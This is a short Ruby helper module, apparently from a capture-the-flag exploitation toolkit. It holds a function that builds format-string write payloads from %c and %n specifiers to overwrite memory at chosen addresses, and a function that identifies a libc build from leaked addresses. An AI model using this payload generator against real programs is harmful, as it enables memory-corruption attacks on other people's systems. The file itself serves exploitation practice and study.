# encoding : binary
module Pwnbox
  # For pwnable problem
  module Pwnable
    def self.fsb(target, diff, value, printed = 0)
      payload = (target..target + value.length - 1).to_a.pack('<I*')
      printed = (printed + payload.length) % 256

      value.each_byte do |byte|
        more = byte - printed
        more += 256 if more <= 0
        payload += format('%%%dc%%%d$n', more, diff / 4)

        diff += 4
        printed = byte
      end

      payload
    end

    def self.find_libc(pairs)
      pairs = pairs.flatten
      possible_libc = []

      # return nil if pairs is odd number
      return nil if pairs.length.odd? || pairs.length == 0

      Dir["#{Pwnbox.libc_dir}/**/*"].each do |name|
        next if File.directory? name
        libc = Libc.new(File.basename(name))
        results = pairs.each_slice(2).map { |v| libc.address?(v[0], v[1]) }
        possible_libc.push(libc) if results.reduce(:&)
      end

      possible_libc
    end
  end
end
